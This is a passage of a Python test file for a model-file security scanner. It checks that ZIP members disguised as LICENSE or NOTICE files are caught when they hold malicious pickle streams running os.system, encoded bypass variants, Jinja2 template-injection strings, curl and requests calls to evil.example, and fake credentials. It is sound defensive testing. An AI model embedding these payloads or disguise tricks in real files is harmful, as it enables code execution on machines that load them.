        try:
            result = self.scanner.scan(tmp_path)
            # Security findings in nested members should propagate to top-level success.
            assert result.success is False
            assert result.has_errors is True

            # Check that we at least tried to scan the pickle
            assert result.bytes_scanned > 0

            # May have error issues due to the bug in pickle scanner with string_stack
            # or it may detect the dangerous content
            # Either way, it should have scanned the file
        finally:
            os.unlink(tmp_path)

    def test_scan_zip_with_proto0_pickle_disguised_as_text(self, tmp_path: Path) -> None:
        """Protocol 0 pickle in .txt entry should still be detected as pickle content."""
        archive_path = tmp_path / "proto0_payload.zip"
        with zipfile.ZipFile(archive_path, "w") as z:
            z.writestr("payload.txt", b'cos\nsystem\n(S"echo pwned"\ntR.')

        result = self.scanner.scan(str(archive_path))
        assert result.success is False
        assert result.has_errors is True

        critical_messages = [
            issue.message.lower() for issue in result.issues if issue.severity == IssueSeverity.CRITICAL
        ]
        assert any("os.system" in msg or "posix.system" in msg for msg in critical_messages), (
            f"Expected critical os/posix.system issue, got: {critical_messages}"
        )

    def test_scan_zip_with_prefixed_proto0_pickle_disguised_as_text(self, tmp_path: Path) -> None:
        """Protocol 0 pickles with MARK/LIST prefixes in .txt entries should be detected."""
        archive_path = tmp_path / "proto0_prefixed_payload.zip"
        with zipfile.ZipFile(archive_path, "w") as z:
            z.writestr("payload.txt", b'(lp0\n0cos\nsystem\n(S"echo pwned"\ntR.')

        result = self.scanner.scan(str(archive_path))
        assert result.success is False
        assert result.has_errors is True

        critical_messages = [
            issue.message.lower() for issue in result.issues if issue.severity == IssueSeverity.CRITICAL
        ]
        assert any("os.system" in msg or "posix.system" in msg for msg in critical_messages), (
            f"Expected critical os/posix.system issue, got: {critical_messages}"
        )

    @pytest.mark.parametrize(
        "payload",
        [
            pytest.param(
                b"MIT License\n\nCopyright (c) 2026 Example\nPermission is hereby granted.\n",
                id="standard-license",
            ),
            pytest.param(
                b"Copyright notice.\nMIT License\nPermission is hereby granted.\n",
                id="ordinary-copyright-notice",
            ),
        ],
    )
    def test_scan_zip_routes_legal_text_member_to_text_scanner(self, tmp_path: Path, payload: bytes) -> None:
        archive_path = tmp_path / "legal_text_member.zip"
        with zipfile.ZipFile(archive_path, "w") as z:
            z.writestr("LICENSE", payload)

        result = self.scanner.scan(str(archive_path))

        assert result.success is True
        assert any(
            check.name == "File Type Identification"
            and check.details.get("file_type") == "license"
            and check.details.get("zip_entry") == "LICENSE"
            for check in result.checks
        )
        assert not any(issue.rule_code in {"S901", "S902"} for issue in result.issues)

    def test_scan_zip_routes_legal_tokenizer_template_to_jinja_scanner(self, tmp_path: Path) -> None:
        archive_path = tmp_path / "legal_tokenizer_template.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr(
                "LICENSE",
                b'{"license":"MIT","chat_template":"{{ \'\'.__class__.__mro__[1].__subclasses__() }}"}',
            )

        result = self.scanner.scan(str(archive_path))

        assert any(
            check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
            for check in result.checks
        )

    def test_scan_zip_preserves_legal_jax_template_overlap_analyses(self, tmp_path: Path) -> None:
        archive_path = tmp_path / "legal_jax_template_overlap.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr(
                "LICENSE",
                b'{"license":"MIT","chat_template":"{{ \'\'.__class__.__mro__[1].__subclasses__() }}",'
                b'"framework":"jax","orbax_version":"0.1.0",'
                b'"payload":"jax.experimental.host_callback.call(os.system, \'id\')"}',
            )

        result = self.scanner.scan(str(archive_path))

        assert any(
            check.name == "JSON Pattern Security Check"
            and check.status == CheckStatus.FAILED
            and check.details.get("zip_entry") == "LICENSE"
            for check in result.checks
        )
        assert any(
            check.name == "Jinja2 Template Injection Detection"
            and check.status == CheckStatus.FAILED
            and check.details.get("zip_entry") == "LICENSE"
            for check in result.checks
        )

    @pytest.mark.parametrize(
        "member_name",
        ["LICENSE", "LICENSE.markdown", "NOTICE.markdown", r"docs\LICENSE"],
    )
    def test_scan_zip_uses_logical_legal_member_name_for_network_classification(
        self,
        tmp_path: Path,
        member_name: str,
    ) -> None:
        archive_path = tmp_path / "legal_text_member_with_url.zip"
        with zipfile.ZipFile(archive_path, "w") as z:
            _writestr_preserving_member_name(
                z,
                member_name,
                "MIT License\n\n"
                "Copyright (c) 2026 Example\n"
                "Permission is hereby granted.\n"
                "See https://www.apache.org/licenses/LICENSE-2.0 for the full license text.\n",
            )

        result = self.scanner.scan(str(archive_path))

        assert result.success is True
        license_network_issues = [
            issue
            for issue in result.issues
            if issue.rule_code == "S309" and issue.details.get("zip_entry") == member_name
        ]
        assert license_network_issues
        assert all(issue.severity == IssueSeverity.INFO for issue in license_network_issues)
        expected_type = (
            "license" if member_name.replace("\\", "/").rsplit("/", 1)[-1].startswith("LICENSE") else "notice"
        )
        assert any(
            check.name == "File Type Identification"
            and check.details.get("file_type") == expected_type
            and check.details.get("zip_entry") == member_name
            for check in result.checks
        )
        assert any(
            content.get("path") == f"{archive_path}:{member_name}" for content in result.metadata.get("contents", [])
        )

    @pytest.mark.parametrize(
        ("member_name", "content", "expected_rule"),
        [
            ("LICENSE.md", 'requests.get("https://evil.example/payload")\n', "S302"),
            ("LICENSE.txt", "Authorization: Basic dXNlcjpwYXNz\n", "S702"),
            (
                "LICENSE.rst",
                'import subprocess\nsubprocess.run(["curl", "https://evil.example/payload"])\n',
                "S309",
            ),
        ],
    )
    def test_scan_zip_preserves_main_owned_license_extensions_without_legal_keywords(
        self,
        tmp_path: Path,
        member_name: str,
        content: str,
        expected_rule: str,
    ) -> None:
        archive_path = tmp_path / "main_owned_license_extensions.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr(member_name, content)

        result = self.scanner.scan(str(archive_path))

        assert result.success is False
        assert any(
            check.rule_code == expected_rule and check.details.get("zip_entry") == member_name
            for check in result.checks
        )

    @pytest.mark.parametrize("member_name", ["LICENSE.env", "NOTICE.env", r"docs\LICENSE.env"])
    def test_scan_zip_routes_legal_stem_env_members_as_env_and_detects_aws_credentials(
        self,
        tmp_path: Path,
        member_name: str,
    ) -> None:
        archive_path = tmp_path / "legal_stem_env.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            _writestr_preserving_member_name(
                archive,
                member_name,
                "AWS_ACCESS_KEY_ID=AKIAABCDEFGHIJKLMNOP\n",
            )

        result = self.scanner.scan(str(archive_path))

        assert result.success is False
        assert any(
            check.rule_code == "S704" and check.details.get("zip_entry") == member_name for check in result.checks
        )
        assert not any(
            check.details.get("file_type") in {"license", "notice"} and check.details.get("zip_entry") == member_name
            for check in result.checks
        )

    def test_scan_zip_numpy_license_basic_permissions_does_not_report_basic_auth(self, tmp_path: Path) -> None:
        archive_path = tmp_path / "numpy_license.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr(
                "LICENSE.txt",
                "NumPy license information\n"
                "GNU GENERAL PUBLIC LICENSE Version 3\n"
                "Copyright 2026 NumPy Developers\n"
                "2. Basic Permissions.\n"
                "Permission is granted to use and redistribute this software.\n",
            )

        result = self.scanner.scan(str(archive_path))

        assert result.success is True
        assert not any(check.rule_code == "S702" for check in result.checks)

    def test_scan_zip_legal_member_keeps_real_basic_auth_detection(self, tmp_path: Path) -> None:
        archive_path = tmp_path / "license_with_credentials.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr(
                "LICENSE.txt",
                "MIT License\nCopyright Example\nAuthorization: Basic dXNlcjpwYXNz\n",
            )

        result = self.scanner.scan(str(archive_path))

        assert result.success is False
        assert any(
            check.rule_code == "S702"
            and check.details.get("secret_type") == "Basic Auth Credentials"
            and check.details.get("zip_entry") == "LICENSE.txt"
            for check in result.checks
        )

    @pytest.mark.parametrize(
        ("payload", "expected_issue"),
        [
            (
                b'<?xml version="1.0"?><PMML version="4.4"><Header><Extension>'
                b"<script>system('id')</script></Extension></Header><Copyright>MIT License</Copyright></PMML>",
                "suspicious",
            ),
            (
                b'<?xml version="1.0"?><net version="10"><layers>'
                b'<layer id="1" name="evil" type="Python" library="evil.so"/>'
                b"</layers><copyright>MIT License</copyright></net>",
                "python layer",
            ),
        ],
    )
    def test_scan_zip_routes_structured_xml_license_member_before_text(
        self,
        tmp_path: Path,
        payload: bytes,
        expected_issue: str,
    ) -> None:
        archive_path = tmp_path / "structured_license_member.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("LICENSE", payload)

        result = self.scanner.scan(str(archive_path))

        assert any(expected_issue in issue.message.lower() for issue in result.issues)
        assert not any(
            check.name == "File Type Identification"
            and check.details.get("file_type") == "license"
            and check.details.get("zip_entry") == "LICENSE"
            for check in result.checks
        )

    @pytest.mark.parametrize(
        ("payload", "expected_outcome"),
        [
            (b"S'MIT License'\n.Pdangerous\n", "inconclusive"),
            (b"cposix\nsystem\n0MIT License\nCopyright Example\n", "security_finding"),
            (b"cposix\nsystem\n2MIT License\nCopyright Example\n", "security_finding"),
            (b"cposix\nsystem\nPid\nMIT License\nCopyright Example\n", "security_finding"),
            (b"cposix\nsystem\naMIT License\nCopyright Example\n", "security_finding"),
            (b"cposix\nsystem\nsMIT License\nCopyright Example\n", "security_finding"),
            (b"cposix\nsystem\ntMIT License\nCopyright Example\n", "security_finding"),
            (b"cposix\nsystem\nlMIT License\nCopyright Example\n", "security_finding"),
            (b"cposix\nsystem\ndMIT License\nCopyright Example\n", "security_finding"),
            (b"cposix\nsystem\np0\nMIT License\nCopyright Example\n", "security_finding"),
            (b"cposix\nsystem\ng0\nMIT License\nCopyright Example\n", "security_finding"),
            (b"cposix\nsystem\nbMIT License\nCopyright Example\n", "security_finding"),
        ],
    )
    def test_scan_zip_fails_closed_for_suspicious_legal_pickle_continuation(
        self,
        tmp_path: Path,
        payload: bytes,
        expected_outcome: str,
    ) -> None:
        archive_path = tmp_path / "legal_pickle_continuation.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("LICENSE", payload)

        result = self.scanner.scan(str(archive_path))

        assert result.success is False
        if expected_outcome == "inconclusive":
            assert any(
                check.name == "Pickle Routing" and check.details.get("zip_entry") == "LICENSE"
                for check in result.checks
            )
        else:
            assert any(
                issue.rule_code == "S201" and issue.details.get("zip_entry") == "LICENSE" for issue in result.issues
            )

    @pytest.mark.parametrize(
        "pickle_stream",
        [
            pytest.param(b"]cposix\nsystem\na.", id="EMPTY_LIST-APPEND"),
            pytest.param(b"(cposix\nsystem\nt.", id="MARK-TUPLE"),
            pytest.param(b"(S'key'\ncposix\nsystem\nd.", id="MARK-STRING-DICT"),
        ],
    )
    def test_scan_zip_fails_closed_for_embedded_global_with_pre_global_stack_context(
        self,
        tmp_path: Path,
        pickle_stream: bytes,
    ) -> None:
        archive_path = tmp_path / "embedded_pre_global_stack.zip"
        payload = b"MIT License\nCopyright Example\nThe documentation contains a serialized example:\n" + pickle_stream
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("LICENSE", payload)

        result = self.scanner.scan(str(archive_path))

        assert result.success is False
        assert any(
            check.name == "Pickle Routing" and check.details.get("zip_entry") == "LICENSE" for check in result.checks
        )

    def test_scan_zip_fails_closed_for_backslash_legal_member_with_embedded_pickle(self, tmp_path: Path) -> None:
        archive_path = tmp_path / "backslash_legal_member.zip"
        member_name = r"docs\LICENSE"
        payload = b"MIT License\nCopyright Example\n" + b"cposix\nsystem\n(S'id'\ntR."
        with zipfile.ZipFile(archive_path, "w") as archive:
            _writestr_preserving_member_name(archive, member_name, payload)

        result = self.scanner.scan(str(archive_path))

        _assert_inconclusive_pickle_member(result, archive_path, member_name)

    def test_scan_zip_fails_closed_for_protocolless_binary_pickle_in_legal_member(self, tmp_path: Path) -> None:
        archive_path = tmp_path / "protocolless_binary_pickle.zip"
        member_name = r"docs\LICENSE"
        protocol_less_pickle = b"\x8c\x0emystery_module\x8c\x05thing\x93)R."
        payload = b"MIT License\nCopyright Example\n" + protocol_less_pickle
        with zipfile.ZipFile(archive_path, "w") as archive:
            _writestr_preserving_member_name(archive, member_name, payload)

        result = self.scanner.scan(str(archive_path))

        _assert_inconclusive_pickle_member(result, archive_path, member_name)

    def test_scan_zip_fails_closed_for_oversized_legal_member(self, tmp_path: Path) -> None:
        archive_path = tmp_path / "oversized_legal_member.zip"
        prefix = b"NOTICE\nCopyright (c) Example\n"
        malicious_tail = b"cposix\nsystem\n(S'id'\ntR."
        payload = prefix + (b"A" * (file_detection._LEGAL_TEXT_ROUTE_MAX_BYTES + 1 - len(prefix))) + malicious_tail
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("NOTICE", payload)

        result = self.scanner.scan(str(archive_path))

        _assert_inconclusive_pickle_member(result, archive_path, "NOTICE")

    def test_scan_zip_fails_closed_for_urlsafe_base64_encoded_pickle_member(self, tmp_path: Path) -> None:
        archive_path = tmp_path / "urlsafe_encoded_pickle.zip"
        embedded_pickle = b"\xfb" + b"cposix\nsystem\n(S'id'\ntR."
        token = base64.urlsafe_b64encode(embedded_pickle)
        assert b"-" in token or b"_" in token
        payload = b"MIT License\nCopyright Example\n" + token + b"\n"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("LICENSE", payload)

        result = self.scanner.scan(str(archive_path))

        _assert_inconclusive_pickle_member(result, archive_path, "LICENSE")

    @pytest.mark.parametrize(
        ("payload", "expected_exit_code"),
        [
            pytest.param(
                b"C\tAAAAAAAAAcmystery_module\nthing\nApache License\n",
                1,
                id="short-binbytes-then-GLOBAL",
            ),
            pytest.param(b"imystery_module\nThing\nApache License\n", 2, id="initial-INST-without-MARK"),
            pytest.param(
                b"MIT License\n(imystery_module\nThing\nApache License\n",
                2,
                id="embedded-stack-valid-INST",
            ),
            pytest.param(base64.b64encode(b"cb\nx\n."), 1, id="short-base64"),
            pytest.param(binascii.hexlify(b"cb\nx\n."), 1, id="short-hex"),
            pytest.param(
                _wrap_encoded_lines(base64.b64encode(b"cbuiltins\neval\n(V1+1\ntR."), 8),
                1,
                id="line-wrapped-base64",
            ),
            pytest.param(
                _wrap_encoded_lines(binascii.hexlify(b"cbuiltins\neval\n(V1+1\ntR."), 18),
                1,
                id="line-wrapped-hex",
            ),
            pytest.param(b"MIT License\n\x82\x01)R.", 2, id="embedded-EXT1"),
            pytest.param(b"MIT License\nPid\n)R.", 2, id="embedded-PERSID"),
            pytest.param(b"mit\nVb\nVx\n\x93)R.", 2, id="embedded-STACK_GLOBAL-unicode"),
            pytest.param(b"Pid\nApache License\n", 1, id="whole-PERSID"),
            pytest.param(b"MIT License\nXPid\n)R.\n", 2, id="adjacent-embedded-PERSID"),
            pytest.param(b"\x82\x01", 1, id="sole-EXT1"),
            pytest.param(b"\x97", 1, id="sole-NEXT_BUFFER"),
            pytest.param("cmódulo\nthing\n.".encode(), 1, id="unicode-GLOBAL-operand"),
            pytest.param(b"cevil/module\nthing\nMIT License\n", 1, id="GLOBAL-slash-operand"),
            pytest.param(
                b"MIT License\ncmystery_module\nThing\nApache License\n",
                2,
                id="embedded-import-only-GLOBAL",
            ),
            pytest.param(b"MIT License\nS'id'\nQApache License\n", 2, id="embedded-BINPERSID"),
            pytest.param(b"MIT\nXS'id'\nQtext\n", 2, id="mid-line-STRING-before-BINPERSID"),
            pytest.param(
                b"MIT License\nNcposix\nsystem\n(S'id'\ntR.",
                2,
                id="trivial-prefix-before-GLOBAL",
            ),
            pytest.param(
                b"MIT License\nAcposix\nsystem\n(S'id'\ntRApache License\n",
                2,
                id="non-opcode-prefix-before-GLOBAL",
            ),
            pytest.param(b"MIT License\nNPid\n.", 2, id="trivial-prefix-before-PERSID"),
            pytest.param(
                _long_binpersid_lookbehind_in_legal_text(),
                2,
                id="truncated-BINPERSID-lookbehind",
            ),
            pytest.param(
                b"MIT License\nprefix cposix\nsystem\n(S'id'\ntR.",
                2,
                id="mid-line-GLOBAL",
            ),
            pytest.param(
                b"#cposix\nsystem\n(S'id'\ntR.\nMIT License",
                2,
                id="comment-prefixed-GLOBAL",
            ),
            pytest.param(_overlapping_global_candidate_in_legal_text(), 2, id="overlapping-comment-GLOBAL"),
            pytest.param(
                b"MIT License\nCopyright Y2IK eAou\n",
                1,
                id="base64-same-line-prose-prefix",
            ),
            pytest.param(b"MIT License\nY2IK eAou\n", 1, id="base64-intra-line-whitespace"),
            pytest.param(b"MIT License\n63620a 780a2e\n", 1, id="hex-intra-line-whitespace"),
            pytest.param(b"MIT License\nY 2IKeAou\n", 1, id="base64-unaligned-intra-line-whitespace"),
            pytest.param(b"MIT License\n6 3620a780a2e\n", 1, id="hex-unaligned-intra-line-whitespace"),
            pytest.param(b"MIT License\nY 2IK\ne Aou\n", 1, id="base64-mixed-line-whitespace"),
            pytest.param(b"MIT License\n63 62\n0a78 0a2e\n", 1, id="hex-mixed-line-whitespace"),
            pytest.param(b"MIT License\nY2IK\teAou\n", 1, id="base64-intra-line-tab"),
            pytest.param(b"MIT License\n63620a\t780a2e\n", 1, id="hex-intra-line-tab"),
            pytest.param(base64.b64encode(b"S'id'\nQ."), 1, id="base64-BINPERSID"),
            pytest.param(binascii.hexlify(b"S'id'\nQ."), 1, id="hex-BINPERSID"),
            pytest.param(b"MIT License\n" + base64.b64encode(b"\x82\x01"), 1, id="base64-sole-EXT1"),
            pytest.param(b"MIT License\n" + base64.b64encode(b"\x97"), 1, id="base64-sole-NEXT_BUFFER"),
            pytest.param(b"MIT License\nWFBpZAou\n", 2, id="base64-alpha-prefixed-PERSID"),
            pytest.param(b"MIT License\nWF Bp ZA ou\n", 2, id="base64-spaced-alpha-prefixed-PERSID"),
            pytest.param(
                b"MIT License\nWF Bp\nZA ou\n",
                2,
                id="base64-split-spaced-alpha-prefixed-PERSID",
            ),
            pytest.param(b"MIT License\nggE =\n", 1, id="base64-whitespace-padded-EXT1"),
            pytest.param(b"MIT License\nlw ==\n", 1, id="base64-whitespace-padded-NEXT_BUFFER"),
            pytest.param(b"MIT License\ngwEA\n", 1, id="base64-unpadded-alphabetic-EXT2"),
            pytest.param(b"MIT License\nggE\n", 1, id="base64-unpadded-alphabetic-EXT1"),
            pytest.param(b"MIT License\nlw\n", 1, id="base64-unpadded-alphabetic-NEXT_BUFFER"),
            pytest.param(
                b"MIT License\ngASMAWGMAWGTLg\n",
                1,
                id="base64-alphabetic-protocol-STACK_GLOBAL",
            ),
            pytest.param(b"MIT License\nZXZhbCg\n", 2, id="base64-alphabetic-execution-syntax"),
            pytest.param(
                b"MIT License\nAA AA\ng g\nE\n",
                1,
                id="base64-split-weak-side-effect-alignment-collision",
            ),
            pytest.param(
                b"MIT License\n" + base64.b64encode(b"# comment\ncposix\nsystem\n(S'id'\ntR."),
                2,
                id="base64-overlapping-comment-GLOBAL",
            ),
            pytest.param(_oversized_encoded_execution_after_probe(), 2, id="base64-execution-after-decoded-limit"),
            pytest.param(
                _encoded_pickle_after_benign_candidate_budget(),
                1,
                id="encoded-pickle-after-benign-candidate-budget",
            ),
            pytest.param(
                _encoded_pickle_after_benign_candidate_budget(b"groups"),
                1,
                id="encoded-pickle-after-weak-candidate-budget",
            ),
            pytest.param(_long_global_operand_in_legal_text(), 2, id="truncated-GLOBAL-operand"),
        ],
    )
    def test_scan_zip_rejects_shared_structural_pickle_bypasses(
        self,
        tmp_path: Path,
        payload: bytes,
        expected_exit_code: int,
    ) -> None:
        archive_path = tmp_path / "structural_pickle_bypass.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("LICENSE", payload)

        result = core.scan_model_directory_or_file(str(archive_path), cache_enabled=False)

        assert core.determine_exit_code(result) == expected_exit_code
        assert result.success is False
        if expected_exit_code == 2:
            assert any(
                check.name == "Pickle Routing" and check.details.get("zip_entry") == "LICENSE"
                for check in result.checks
            )

    @pytest.mark.parametrize(
        "payload",
        [
            pytest.param(b"C\tAAAAAAAAAApache License\n", id="short-binbytes-without-import"),
            pytest.param(
                _wrap_encoded_lines(base64.b64encode(b"hello world"), 8),
                id="line-wrapped-benign-base64",
            ),
            pytest.param(
                _wrap_encoded_lines(binascii.hexlify(b"hello world"), 18),
                id="line-wrapped-benign-hex",
            ),
            pytest.param("MIT License\n∂\n".encode(), id="utf8-partial-pickle-symbol"),
            pytest.param(
                b"MIT License\nPermission is granted to groups of users.\n",
                id="base64-word-groups",
            ),
            pytest.param(b"MIT License\ngroups\n", id="standalone-base64-word-groups"),
            pytest.param(b"MIT License\nCopyright grou ps\n", id="same-line-base64-word-groups"),
            pytest.param(b"MIT License\ngAROLg\n", id="base64-alphabetic-benign-protocol"),
            pytest.param(b"MIT License\nZXZhbA\n", id="base64-alphabetic-execution-near-match"),
            pytest.param(
                b"MIT License\nAA AA\ng r o u\np s\n",
                id="base64-split-word-groups-alignment-collision",
            ),
            pytest.param(b"MIT License\n" + (b"license " * 4096), id="candidate-budget-license-words"),
            pytest.param(b"MIT License\n" + (b"groups " * 4096), id="candidate-budget-groups-words"),
            pytest.param(
                b"MIT License\n" + (b"copyright\nconditions\n" * 4096),
                id="candidate-budget-global-word-lines",
            ),
            pytest.param(
                b"Permission is granted to users.\nPermission remains granted.\n",
                id="two-P-leading-prose-lines",
            ),
            pytest.param(
                b"MIT License\nPermission is\ngranted to\nall users\n",
                id="multiline-spaced-alphabetic-prose",
            ),
            pytest.param(
                b"MIT License\nPURPOSE\nARE DISCLAIMED. IN NO EVENT SHALL THE AUTHORS BE LIABLE.\n",
                id="single-word-P-leading-prose-line",
            ),
            pytest.param(
                b"MIT License\nFOR ANY PARTICULAR PURPOSE OR THAT THE USE OF PYTHON WILL NOT\n",
                id="base64-shaped-uppercase-prose",
            ),
            pytest.param(
                b"MIT License\ncopyright\ncopyright\nconditions\ninclude\n",
                id="overlapping-global-inst-prose-lines",
            ),
            pytest.param(
                b"MIT License\nSoftware is provided.\nQuality terms apply.\n",
                id="context-opcode-leading-prose-lines",
            ),
            pytest.param(
                b"MIT License\nXS'id'\nZtext\n",
                id="mid-line-STRING-without-opcode-continuation",
            ),
            pytest.param(
                b"MIT License\nNcopyright\nconditions\ninclude\n",
                id="trivial-prefix-like-global-prose",
            ),
            pytest.param(
                b"MIT License\nAcopyright\nconditions\ninclude\n",
                id="non-opcode-prefix-like-global-prose",
            ),
            pytest.param(
                b"MIT License\nNPermission\nterms\n",
                id="trivial-prefix-like-persid-prose",
            ),
            pytest.param(b"MIT License\nin to of be dead face\n", id="short-base64-and-hex-words"),
            pytest.param(b"MIT License\n" + (b"in be " * 4096), id="short-base64-word-budget"),
            pytest.param(_long_context_opcode_prose(), id="long-context-opcode-leading-prose"),
            pytest.param(_large_zero_fill_base64_legal_text(), id="oversized-zero-fill-base64-prose"),
        ],
    )
    def test_scan_zip_preserves_benign_structural_pickle_near_matches(
        self,
        tmp_path: Path,
        payload: bytes,
    ) -> None:
        archive_path = tmp_path / "benign_structural_pickle_near_match.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("LICENSE.txt", payload)

        result = core.scan_model_directory_or_file(str(archive_path), cache_enabled=False)

        assert core.determine_exit_code(result) == 0
        assert result.success is True
        assert not any(check.name == "Pickle Routing" for check in result.checks)

    @pytest.mark.parametrize(
        "padding_size",
        [
            file_detection.PROTO0_1_MAX_PROBE_BYTES - 2,
            file_detection.PROTO0_1_MAX_PROBE_BYTES - 1,
            file_detection.PROTO0_1_MAX_PROBE_BYTES,
            file_detection.PROTO0_1_MAX_PROBE_BYTES + 1,
        ],
    )
    def test_scan_zip_fails_closed_for_embedded_global_at_lookbehind_boundary(
        self,
        tmp_path: Path,
        padding_size: int,
    ) -> None:
        archive_path = tmp_path / "embedded_lookbehind_boundary.zip"
        payload = (
            b"MIT License\nCopyright Example\nThe documentation contains a serialized example:\n"
            + b"]"
            + (b"2" * padding_size)
            + b"cposix\nsystem\na."
        )
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("LICENSE", payload)

        result = self.scanner.scan(str(archive_path))

        assert result.success is False
        assert any(
            check.name == "Pickle Routing" and check.details.get("zip_entry") == "LICENSE" for check in result.checks
        )

    @pytest.mark.parametrize(
        "operand_size",
        [
            file_detection.PROTO0_1_MAX_PROBE_BYTES,
            file_detection.PROTO0_1_MAX_PROBE_BYTES + 1,
            file_detection.PROTO0_1_MAX_PROBE_BYTES + 128,
        ],
    )
    def test_scan_zip_recovers_protocol0_line_operand_boundary_before_embedded_global(
        self,
        tmp_path: Path,
        operand_size: int,
    ) -> None:
        archive_path = tmp_path / "embedded_line_operand_boundary.zip"
        payload = (
            b"MIT License\nCopyright Example\nThe documentation contains a serialized example:\n]S'"
            + (b"A" * operand_size)
            + b"'\n0cposix\nsystem\na."
        )
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("LICENSE", payload)

        result = self.scanner.scan(str(archive_path))

        assert result.success is False
        assert any(
            check.name == "Pickle Routing" and check.details.get("zip_entry") == "LICENSE" for check in result.checks
        )

    @pytest.mark.parametrize("member_name", ["LICENSE", "LICENSE.txt"])
    def test_scan_zip_keeps_malicious_pickle_named_license_on_pickle_route(
        self,
        tmp_path: Path,
        member_name: str,
    ) -> None:
        archive_path = tmp_path / "malicious_license_member.zip"
        with zipfile.ZipFile(archive_path, "w") as z:
            z.writestr(member_name, b'cposix\nsystem\n(S"echo pwned"\ntR.')

        result = self.scanner.scan(str(archive_path))

        assert result.success is False
        assert any(
            issue.rule_code == "S201" and issue.details.get("zip_entry") == member_name for issue in result.issues
        )

    @pytest.mark.parametrize(
        ("payload", "expected_import_reference"),
        [
            pytest.param(
                b"(cmystery_module\nthing\nS'MIT License'\nl.",
                "mystery_module.thing",
                id="complete-stream",
            ),
            pytest.param(
                b"cmystery_module\nthing\n.MIT License\nCopyright Example\n",
                "mystery_module.thing",
                id="complete-prefix-with-trailing-prose",
            ),
            pytest.param(
                b"cmystery_module\nthing\nApache License\n",
                "mystery_module.thing",
                id="import-before-invalid-continuation",
            ),
            pytest.param(
                b"copyright\nnotice\n.\nMIT License\n",
                "opyright.notice",
                id="legal-looking-GLOBAL-operands",
            ),
        ],
    )
    def test_scan_zip_reports_import_only_global_in_backslash_license_member(
        self,
        tmp_path: Path,
        payload: bytes,
        expected_import_reference: str,
    ) -> None:
        archive_path = tmp_path / "import_only_global.zip"
        member_name = r"docs\LICENSE"
        with zipfile.ZipFile(archive_path, "w") as archive:
            _writestr_preserving_member_name(
                archive,
                member_name,
                payload,
            )

        result = core.scan_model_directory_or_file(str(archive_path), cache_enabled=False)

        assert core.determine_exit_code(result) == 1
        assert any(
            issue.rule_code == "NON_ALLOWLISTED_GLOBAL"
            and issue.location == f"{archive_path}:{member_name}"
            and issue.details.get("zip_entry") == member_name
            and issue.details.get("import_reference") == expected_import_reference
            for issue in result.issues
        )

    def test_scan_zip_fails_closed_for_inst_before_invalid_continuation(self, tmp_path: Path) -> None:
        archive_path = tmp_path / "inst_before_invalid_continuation.zip"
        member_name = r"docs\LICENSE"
        with zipfile.ZipFile(archive_path, "w") as archive:
            _writestr_preserving_member_name(
                archive,
                member_name,
                b"(imystery_module\nThing\nApache License\n",
            )

        result = self.scanner.scan(str(archive_path))

        _assert_inconclusive_pickle_member(result, archive_path, member_name)

    def test_scan_zip_routes_lightgbm_in_backslash_license_member_before_text(self, tmp_path: Path) -> None:
        archive_path = tmp_path / "lightgbm_license.zip"
        member_name = r"docs\LICENSE"
        with zipfile.ZipFile(archive_path, "w") as archive:
            _writestr_preserving_member_name(
                archive,
                member_name,
                _malicious_lightgbm_legal_payload(),
            )

        result = core.scan_model_directory_or_file(str(archive_path), cache_enabled=False)

        assert core.determine_exit_code(result) == 1
        assert any(
            check.name == "Command Indicator Check"
            and check.status == CheckStatus.FAILED
            and check.severity == IssueSeverity.CRITICAL
            and check.location == f"{archive_path}:{member_name}"
            and check.details.get("zip_entry") == member_name
            for check in result.checks
        )

    def test_scan_zip_routes_oversized_lightgbm_license_member_before_text(self, tmp_path: Path) -> None:
        archive_path = tmp_path / "oversized_lightgbm_license.zip"
        payload = _malicious_lightgbm_legal_payload()
        payload += b" " * (file_detection._LEGAL_TEXT_ROUTE_MAX_BYTES + 1 - len(payload))
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("LICENSE", payload)

        result = core.scan_model_directory_or_file(str(archive_path), cache_enabled=False)

        assert core.determine_exit_code(result) == 1
        assert any(
            check.name == "Command Indicator Check"
            and check.status == CheckStatus.FAILED
            and check.details.get("zip_entry") == "LICENSE"
            for check in result.checks
        )

    def test_scan_zip_keeps_webbrowser_pickle_named_notice_on_pickle_route(self, tmp_path: Path) -> None:
        archive_path = tmp_path / "webbrowser_notice_member.zip"
        with zipfile.ZipFile(archive_path, "w") as z:
            z.writestr("NOTICE", b"cwebbrowser\nopen\n(S'http://example.com'\ntR.")

        result = self.scanner.scan(str(archive_path))

        assert result.success is False
        assert any(issue.rule_code == "S201" and issue.details.get("zip_entry") == "NOTICE" for issue in result.issues)

    def test_scan_zip_keeps_requests_pickle_named_license_on_pickle_route(self, tmp_path: Path) -> None:
        archive_path = tmp_path / "requests_license_member.zip"
        with zipfile.ZipFile(archive_path, "w") as z:
            z.writestr("LICENSE", b"crequests\nget\n(S'http://example.com'\ntR.")

        result = self.scanner.scan(str(archive_path))

        assert result.success is False
        assert any(issue.rule_code == "S201" and issue.details.get("zip_entry") == "LICENSE" for issue in result.issues)

    @pytest.mark.parametrize(
        ("member_name", "payload"),
        [
            pytest.param("LICENSE", b"MIT License\nCopyright\x00", id="extensionless"),
            pytest.param("LICENSE.txt", b"MIT License\nCopyright\x00", id="txt"),
            pytest.param("LICENSE.md", b"MIT License\nCopyright \xe2\x82", id="markdown"),
            pytest.param("LICENSE.rst", b"MIT License\nCopyright\xff", id="rst"),
        ],
    )
    def test_scan_zip_does_not_text_route_invalid_legal_member(
        self,
        tmp_path: Path,
        member_name: str,
